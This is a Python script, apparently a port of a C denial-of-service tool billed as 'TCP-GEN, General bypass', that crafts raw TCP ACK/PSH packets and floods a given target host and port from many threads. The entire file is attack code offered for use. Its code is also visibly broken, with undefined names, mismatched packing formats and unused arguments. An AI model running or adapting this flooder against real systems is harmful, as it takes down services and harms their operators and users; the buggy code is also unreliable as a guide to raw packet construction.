import socket
import struct
import random
import threading
import time

MAX_PACKET_SIZE = 4096
PHI = 0x9e3779b9

Q = [0] * 4096
c = 362436
floodport = 0
limiter = 0
pps = 0
sleeptime = 100

def init_rand(x):
    global Q
    Q[0] = x
    Q[1] = x + PHI
    Q[2] = x + PHI + PHI
    for i in range(3, 4096):
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i

def rand_cmwc():
    global Q, c
    a = 18782
    t = a * Q[4095] + c
    c = t >> 32
    x = t + c
    if x < c:
        x += 1
        c += 1
    Q[4095] = 0xfffffffe - x
    return Q[4095]

def csum(buf):
    sum_ = 0
    count = len(buf)
    idx = 0
    while count > 1:
        sum_ += buf[idx] << 8 | buf[idx+1]
        idx += 2
        count -= 2
    if count > 0:
        sum_ += (buf[idx] << 8)
    while sum_ >> 16:
        sum_ = (sum_ & 0xffff) + (sum_ >> 16 & 0xffff)
    return ~sum_ & 0xffff

def checksum_tcpudp(iph, buff, data_len):
    buf = struct.unpack("!%sH" % (len(buff) // 2), buff)
    ip_src = struct.unpack("!I", iph[12:16])[0]
    ip_dst = struct.unpack("!I", iph[16:20])[0]
    sum_ = 0
    for i in range(len(buf)):
        sum_ += buf[i]
    sum_ += (ip_src >> 16) & 0xFFFF
    sum_ += ip_src & 0xFFFF
    sum_ += (ip_dst >> 16) & 0xFFFF
    sum_ += ip_dst & 0xFFFF
    sum_ += socket.htons(socket.IPPROTO_TCP)
    sum_ += data_len
    while sum_ >> 16:
        sum_ = (sum_ & 0xFFFF) + (sum_ >> 16)
    return (~sum_) & 0xffff

def tcpcsum(iph, tcph):
    src_addr = struct.unpack("!I", iph[12:16])[0]
    dst_addr = struct.unpack("!I", iph[16:20])[0]
    pseudohead = struct.pack('!4s4sBBH', 
                             socket.inet_aton(str(src_addr)),
                             socket.inet_aton(str(dst_addr)),
                             0, socket.IPPROTO_TCP, 
                             socket.htons(len(tcph)))
    psh = pseudohead + tcph
    return csum(psh)

def randnum(min_num, max_num):
    return random.randint(min_num, max_num)

def setup_ip_header(iph):
    iph_ihl_ver = (4 << 4) | 5
    iph_tos = 0
    iph_tot_len = struct.calcsize('!BBHHHBBH4s4s')
    iph_id = random.randint(30000, 30000 + 38323)
    iph_frag_off = 0
    iph_ttl = 52
    iph_proto = socket.IPPROTO_TCP
    iph_check = 0  
    iph_saddr = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
    iph_daddr = socket.inet_aton(td)
    return struct.pack('!BBHHHBBH4s4s' , iph_ihl_ver, iph_tos, iph_tot_len, 
                       iph_id, iph_frag_off, iph_ttl, iph_proto, iph_check, 
                       iph_saddr, iph_daddr)

def setup_tcp_header(tcph):
    tcph_source = random.choice(sourceports)
    tcph_dest = floodport
    tcph_seq = 0
    tcph_ack_seq = 1
    tcph_doff = 5
    tcph_urg = 0
    tcph_ack = 1
    tcph_psh = 1
    tcph_rst = 0
    tcph_syn = 0
    tcph_fin = 0
    tcph_win = socket.htons(64240)
    tcph_check = 0
    tcph_urg_ptr = 0
    return struct.pack('!HHLLBBHHH', 
                       tcph_source, tcph_dest, tcph_seq, tcph_ack_seq, 
                       tcph_doff, tcph_urg, tcph_ack, tcph_psh, 
                       tcph_win, tcph_check, tcph_urg_ptr)

def flood(td):
    global pps, limiter, sleeptime, floodport
    datagram = bytearray(MAX_PACKET_SIZE)
    iph = setup_ip_header(datagram)
    tcph = setup_tcp_header(datagram[len(iph):])
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sin = (td, floodport)
    
    while True:
        s.sendto(datagram, sin)
        iph = setup_ip_header(datagram)
        iph_check = csum(datagram)
        iph = datagram[:len(iph)]
        iph += struct.pack('H', iph_check)
        tcph = setup_tcp_header(datagram[len(iph):])
        tcph_check = tcpcsum(iph, tcph)
        tcph = datagram[len(iph):len(iph)+20]
        tcph += struct.pack('H', tcph_check)
        pps += 1
        if pps >= limiter:
            time.sleep(sleeptime / 1000000.0)
            pps = 0

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 6:
        print("TCP-GEN, General bypass.")
        print("Syntax: {} <target> <port> <threads> <pps> <time>".format(sys.argv[0]))
        sys.exit(-1)

    num_threads = int(sys.argv[3])
    floodport = int(sys.argv[2])
    maxpps = int(sys.argv[4])
    limiter = 0
    pps = 0

    multiplier = 20
    threads = []
    
    for i in range(num_threads):
        t = threading.Thread(target=flood, args=(sys.argv[1],))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

    print("Bypass complete.")